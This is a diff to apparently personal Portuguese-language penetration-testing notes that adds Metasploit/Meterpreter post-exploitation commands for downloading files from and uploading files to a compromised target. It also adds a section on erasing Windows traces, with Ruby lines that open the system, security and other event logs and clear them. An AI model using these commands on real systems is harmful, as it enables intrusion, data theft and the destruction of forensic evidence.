@@ -227,6 +227,14 @@ OWASP
   <user username="tomcat" password="s3cret" roles="manager"/>
 
 Metasploit - Armitage
+  help
+  os comandos padrão do linux funciona quando ja esta em uma maquina alvo (cd, pwd, ls...)
+  download arquivo_alvo -> baixa um arquivo da maquina alvo
+  upload nome_arquivo -> manda um arquivo pra maquina alvo
+  lpwd -> local padrão kali
+  lcd -> mudar de diretorio kali
+  search -> procura algo na maquina
+  shell -> usa a shell do windows
   vim /usr/share/metasploit-framework/data/wordlists/root_userpass.txt -> wordlist
   msfdb init -> inicar o Metasploit
   msfconsole -> abrir o Metasploit
@@ -281,6 +289,15 @@ Metasploit - Armitage
     set srvhost 192.168.100.71 -> endereço minha maquina
     set uripath "filetypes"
     exploit
+  LIMPAR RASTROS WINDOWS
+    irb
+    log = client.sys.eventlog.open('system')
+    log = client.sys.eventlog.open('security')
+    log = client.sys.eventlog.open('application')
+    log = client.sys.eventlog.open('directory service')
+    log = client.sys.eventlog.open('dns server')    
+    log = client.sys.eventlog.open('file replication service')
+    Log.clear
 
 Baixar paginas e projetos web
   wget http://localhost:8080/bodgeit/ -> baixa uma pagina web em html
